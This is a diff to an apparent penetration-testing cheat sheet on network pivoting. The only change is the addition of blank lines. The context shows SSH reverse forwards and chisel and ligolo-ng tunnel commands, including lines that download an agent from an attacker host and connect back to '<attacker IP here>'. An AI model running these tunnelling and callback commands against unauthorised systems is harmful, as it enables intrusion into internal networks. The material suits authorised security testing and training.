@@ -53,6 +53,7 @@ ssh -R 5555:127.0.0.1:5555 -p2222 <user>@<ip>
 # kali
 ./chisel server -p <LISTEN_PORT> --reverse &
 ```
+
 ```cmd
 # windows
 ./chisel client <client_port>:<client_port> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> &
@@ -64,6 +65,7 @@ ssh -R 5555:127.0.0.1:5555 -p2222 <user>@<ip>
 # host
 ./chisel server -p <LISTEN_PORT>
 ```
+
 ```sh
 # kali
 ./chisel client <client_port>:<client_port> <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
@@ -132,6 +134,7 @@ sudo ip link set ligolo up
 ligolo-proxy -selfcert -laddr 0.0.0.0:<port>
 sudo ip route add <ip-range> dev ligolo
 ```
+
 ```
 # host
 wget http://<ip>/<linuxagent>
@@ -139,6 +142,7 @@ OR
 iwr -uri http://<ip>/agent.exe -Outfile agent.exe
 agent.exe -connect <attacker IP here>:<port> -ignore-cert
 ```
+
 ```sh
 # kali
 session
